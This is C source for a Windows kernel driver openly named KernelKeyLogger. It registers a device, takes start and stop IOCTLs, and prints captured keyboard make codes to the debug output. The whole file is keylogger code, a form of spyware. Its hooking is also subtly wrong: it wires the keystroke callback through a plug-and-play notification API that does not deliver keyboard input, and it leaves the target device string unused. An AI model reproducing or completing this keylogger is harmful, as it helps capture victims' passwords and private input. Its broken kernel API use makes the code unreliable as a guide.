#include <ntddk.h>
#include "KernelKeyLogger.h"

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
VOID UnloadDriver(PDRIVER_OBJECT DriverObject);
NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);
VOID KeyloggerCallback(PDEVICE_OBJECT DeviceObject, PKEYBOARD_INPUT_DATA Keys, PULONG DataLength);

PVOID keyboardHookHandle = NULL;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = UnloadDriver;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl;

    UNICODE_STRING deviceName;
    RtlInitUnicodeString(&deviceName, L"\\Device\\KernelKeyLogger");

    PDEVICE_OBJECT DeviceObject = NULL;
    NTSTATUS status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &DeviceObject
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to create device object\n"));
        return status;
    }

    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, L"\\??\\KernelKeyLogger");
    status = IoCreateSymbolicLink(&symLink, &deviceName);

    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(DeviceObject);
        KdPrint(("Failed to create symbolic link\n"));
        return status;
    }

    KdPrint(("KernelKeyLogger Driver Loaded\n"));
    return STATUS_SUCCESS;
}

VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, L"\\??\\KernelKeyLogger");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);

    if (keyboardHookHandle) {
        IoUnregisterPlugPlayNotification(keyboardHookHandle);
    }

    KdPrint(("KernelKeyLogger Driver Unloaded\n"));
}

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_START_KEYLOGGER:
            if (!keyboardHookHandle) {
                UNICODE_STRING targetDevice;
                RtlInitUnicodeString(&targetDevice, L"\\Device\\KeyboardClass0");
                status = IoRegisterPlugPlayNotification(
                    EventCategoryDeviceInterfaceChange,
                    0,
                    NULL,
                    DeviceObject->DriverObject,
                    KeyloggerCallback,
                    NULL,
                    &keyboardHookHandle
                );

                if (!NT_SUCCESS(status)) {
                    KdPrint(("Failed to register keyboard callback\n"));
                } else {
                    KdPrint(("Keyboard callback registered successfully\n"));
                }
            }
            break;

        case IOCTL_STOP_KEYLOGGER:
            if (keyboardHookHandle) {
                IoUnregisterPlugPlayNotification(keyboardHookHandle);
                keyboardHookHandle = NULL;
                KdPrint(("Keyboard callback unregistered successfully\n"));
            }
            break;

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID KeyloggerCallback(PDEVICE_OBJECT DeviceObject, PKEYBOARD_INPUT_DATA Keys, PULONG DataLength) {
    UNREFERENCED_PARAMETER(DeviceObject);
    for (ULONG i = 0; i < *DataLength; i++) {
        KdPrint(("Key: %x\n", Keys[i].MakeCode));
    }
}
